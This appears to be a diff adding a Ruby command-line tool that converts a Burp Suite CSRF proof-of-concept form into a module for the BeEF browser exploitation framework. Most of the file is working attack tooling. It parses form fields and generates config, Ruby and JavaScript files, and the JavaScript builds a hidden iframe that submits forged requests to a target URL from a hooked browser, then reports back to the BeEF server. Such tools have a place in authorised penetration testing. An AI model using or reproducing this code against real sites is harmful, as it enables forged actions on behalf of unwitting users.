@@ -1,0 +1,305 @@
+#!/usr/bin/env ruby
+################################################################################
+# CSRF to BeEF module tool                                                     #
+# TODO:                                                                        #
+# * support xhr                                                                #
+# * support multipart file upload                                              #
+# * support CORS requests                                                      #
+# * support character encoding                                                 #
+################################################################################
+$VERBOSE = false
+$VERSION = '0.0.1'
+
+require 'uri'
+require 'getoptlong'
+require 'fileutils'
+
+#
+# @note Ruby version check
+#
+if RUBY_VERSION < '1.9'
+  puts "Ruby version " + RUBY_VERSION + " is not supported. Please use Ruby 1.9 or later."
+  exit 1
+end
+
+#
+# @note usage
+#
+def usage
+  puts "CSRF to BeEF module tool"
+  puts "[*] Generate a BeEF module using a CSRF PoC from Burp Suite."
+  puts "[*] Usage: ./csrf_to_beef --file sample.html --name [MODULE NAME]"
+  exit 1
+end
+
+usage if ARGV.size < 3
+
+#
+# @note get args
+#
+mname = nil
+fname = nil
+opts = GetoptLong.new(
+    ['-h', '--help', GetoptLong::NO_ARGUMENT],
+    ['-v', '--verbose', GetoptLong::NO_ARGUMENT],
+    ['-n', '--name', GetoptLong::REQUIRED_ARGUMENT],
+    ['-f', '--file', GetoptLong::REQUIRED_ARGUMENT]
+)
+
+#
+# @note Add color to String object
+#
+class String
+  def colorize(color_code)
+    "\e[#{color_code}m#{self}\e[0m"
+  end
+
+  {:red => 31,
+   :green => 32,
+   :yellow => 33,
+   :blue => 34,
+   :pink => 35,
+   :cyan => 36,
+   :white => 37
+  }.each { |color, code|
+    define_method(color) { colorize(code) }
+  }
+end
+
+#
+# @note handle output
+#
+def print_status(msg='')
+  puts '[*] '.blue + msg
+end
+
+def print_error(msg='')
+  puts '[!] '.red + "Error: #{msg}"
+end
+
+def print_good(msg='')
+  puts '[+] '.green + msg
+end
+
+def print_warning(msg='')
+  puts '[!] '.yellow + "Warning: #{msg}"
+end
+
+def print_debug(msg='')
+  puts "#{msg}" if $VERBOSE
+end
+
+#
+# @note handle args
+#
+opts.each do |opt, arg|
+  case opt
+    when '-f', '--file'
+      fname=arg
+    when '-n', '--name'
+      mname=arg
+    when '-h', '--help'
+      usage
+    when '-v', '--verbose'
+      $VERBOSE = true
+  end
+end
+if fname.nil?
+  print_error "'--file' argument is required. (-h for help)"
+  exit 1
+end
+if mname.nil?
+  print_error "'--name' argument is required. (-h for help)"
+  exit 1
+end
+
+#
+# @note Module configuration file 'config.yaml'
+#
+class ConfigFile
+  def generate class_name
+    return <<-EOF
+#
+# Copyright (c) 2006-2014 Wade Alcorn - wade@bindshell.net
+# Browser Exploitation Framework (BeEF) - http://beefproject.com
+# See the file 'doc/COPYING' for copying permission
+#
+beef:
+    module:
+        #{class_name}:
+            enable: true
+            category: "Exploits"
+            name: "#{class_name.capitalize}"
+            description: "#{class_name.capitalize}"
+            authors: ["Burp Suite Professional", "CSRF to BeEF tool"]
+            target:
+                unknown: ["ALL"]
+    EOF
+  end
+end
+
+#
+# @note Module class file 'module.rb'
+#
+class ModuleFile
+  def generate class_name, target_url, options
+    options_rb = ""
+    options.to_enum.with_index(1).each do |input, input_index|
+      options_rb += "      { 'name' => 'input_#{input_index}', 'ui_label' => '#{input[0]}', 'value' => '#{input[1]}' },\n"
+    end
+    return <<-EOF
+#
+# Copyright (c) 2006-2014 Wade Alcorn - wade@bindshell.net
+# Browser Exploitation Framework (BeEF) - http://beefproject.com
+# See the file 'doc/COPYING' for copying permission
+#
+class #{class_name.capitalize} < BeEF::Core::Command
+
+  def self.options
+    return [
+      { 'name' => 'target_url', 'ui_label' => 'Target URL', 'value' => '#{target_url}' },
+#{options_rb}
+    ]
+  end
+
+  def post_execute
+    save({'result' => @datastore['result']})
+  end
+
+end
+    EOF
+  end
+end
+
+#
+# @note Module javascript command file 'command.js'
+#
+class CommandFile
+  def generate class_name, method, enctype, options
+    options_js = ""
+    options.to_enum.with_index(1).each do |input, input_index|
+      options_js += "        {'type':'hidden', 'name':'#{input.first}', 'value':'<%= @input_#{input_index} %>' },\n"
+    end
+    return <<-EOF
+//
+// Copyright (c) 2006-2014 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - http://beefproject.com
+// See the file 'doc/COPYING' for copying permission
+//
+
+beef.execute(function() {
+  var target_url = '<%= @target_url %>'; 
+  var timeout = 15;
+
+  var #{class_name}_iframe_<%= @command_id %> = beef.dom.createIframeXsrfForm(target_url, "#{method}", "#{enctype}",
+      [
+#{options_js}
+      ]);
+
+  beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=exploit attempted");
+
+  cleanup = function() {
+    document.body.removeChild(#{class_name}_iframe_<%= @command_id %>);
+  }
+  setTimeout("cleanup()", timeout*1000);
+
+});
+    EOF
+  end
+end
+
+#
+# @note main
+#
+def main fname, mname
+  # validate class name
+  class_name = mname.gsub(/[^\w]/, '_').downcase
+
+  # read PoC file
+  print_status "Reading PoC from '#{fname}'"
+  begin
+    f = File.open(fname)
+    html = f.readlines()
+  rescue => e
+    print_error "Could not read PoC file - #{e.message}"
+    exit 1
+  end
+
+  # parse PoC file
+  if    html.to_s =~ /var xhr = new XMLHttpRequest/
+    print_error "Could not parse PoC file - XMLHttpRequest is not yet supported."
+    exit 1
+  elsif html.to_s !~ /<form/
+    print_error "Could not parse PoC file - unrecognized format."
+    exit 1
+  end
+
+  method = "GET"
+  enctype = nil
+  target_url = nil
+  options = []
+  html.each do |line|
+    case line
+      # parse form tag
+      when /<form/
+        Hash[line.scan(/(\w+)="(.*?)"/)].each do |k, v|
+          case k
+            when 'action'
+              target_url = v
+            when 'method'
+              method = v
+            when 'enctype'
+              enctype = v
+          end
+        end
+      # parse input tags (module options)
+      when /<input/
+        input_name = nil
+        input_value = nil
+        Hash[line.scan(/(\w+)="(.*?)"/)].each do |k, v|
+          case k
+            when 'type'
+              next
+            when 'name'
+              input_name = v
+            when 'value'
+              input_value = v
+          end
+        end
+        unless input_name.nil?
+          options << [input_name, input_value]
+        end
+    end
+  end
+
+  # write module directory
+  print_status "Making directory '#{class_name}'"
+  unless File.directory?(class_name)
+    FileUtils.mkdir_p(class_name)
+  end
+
+  # generate module config file and write 'config.yaml'
+  print_status "Generating module config file '#{class_name}/config.yaml'"
+  cfg_file = ConfigFile.new.generate(class_name)
+  print_debug cfg_file
+  File.open("#{class_name}/config.yaml", 'w') { |file| file.write(cfg_file) }
+
+  # generate module class file and write 'module.rb'
+  print_status "Generating module class file '#{class_name}/module.rb'"
+  mod_file = ModuleFile.new.generate(class_name, target_url, options)
+  print_debug mod_file
+  File.open("#{class_name}/module.rb", 'w') { |file| file.write(mod_file) }
+
+  # generate module javacript file and write 'command.js'
+  print_status "Generating module javascript file '#{class_name}/command.js'"
+  com_file = CommandFile.new.generate(class_name, method, enctype, options)
+  print_debug com_file
+  File.open("#{class_name}/command.js", 'w') { |file| file.write(com_file) }
+
+  print_good "Complete!"
+  print_status "Now copy the '#{class_name}' directory to the BeEF 'modules/exploits/' directory."
+
+end
+
+main fname, mname
+
